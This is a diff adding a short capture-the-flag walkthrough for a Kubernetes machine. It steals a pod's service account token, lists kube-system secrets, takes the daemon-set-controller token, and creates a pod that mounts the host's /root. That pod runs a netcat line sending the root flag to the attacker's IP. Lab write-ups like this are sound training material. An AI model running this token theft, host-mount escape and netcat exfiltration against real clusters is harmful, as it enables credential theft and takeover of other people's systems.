@@ -1,0 +1,40 @@
+commandAfter getting into user, 
+1. upload kubectl binary, chmod +x kubectl, add it to path maybe.
+2. Get the namespaces, using kubectl get namespace, note the namespaces.
+3. try to get the pods from each namespace, you will see from dev pod there are some pods. kubectl get pods -n dev.
+4. Describe one pod and get the port and IP. kubectl describe pod <pod_name> -n dev
+5. If you enumerate you will figure out it's the same application that you used to get foothold.
+6. Get foothold in that container using the user method. but ip will be the pod IP, and port will be Pod port which is 3000.
+7. When you are inside get the token from /run/secrets/kubernetes.io/serviceaccount/token
+8. Now, in the other pod for each namespace kubectl -n <namespace> --token <the_dev_token_u_copied> auth can-i --list to get the permission.
+9. u will see that you have the permission to get secrets of kube-system namespace. secrets [] [] [get list]
+10. get the secrets kubectl --token <the_dev_token_u_copied> -n kube-system get secrets
+11. You will bunch of secrets Now, https://published-prd.lanyonevents.com/p...ssions.pdf from here we can see that daemon-set-controller has create pod permission.
+12. Get the daemon-set token, kubectl --token <the_dev_token_u_copied> -n kube-system describe secrets daemon-set-controller-token-<someid>
+13. Copy the token again.
+14. you need to create a pod, below is the pod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: some-pod
+  namespace: default
+spec:
+  containers:
+    - name: web
+      image: localhost:5000/dev-alpine
+      command: ["/bin/sh"]
+      args: ["-c", 'cat /root/root.txt | nc -nv <urip> 4444; sleep 100000']
+      volumeMounts:
+      - mountPath: /root/
+        name: root-flag
+  volumes:
+  - hostPath:
+      path: /root/
+      type: ""
+    name: root-flag
+15. save it as pod.yaml, in ur attack box run a netcat revshell.
+16. run kubectl create -f ./pod.yaml --token <the_daemon_set_token> to get the pod and in your netcat shell u should get the root hash.
+
+FAQ:
+Q. How did I know what image to use for the pod?
+A. kubectl get pods --all-namespaces --token <the_daemon_set_token> -o json then checked the image key.
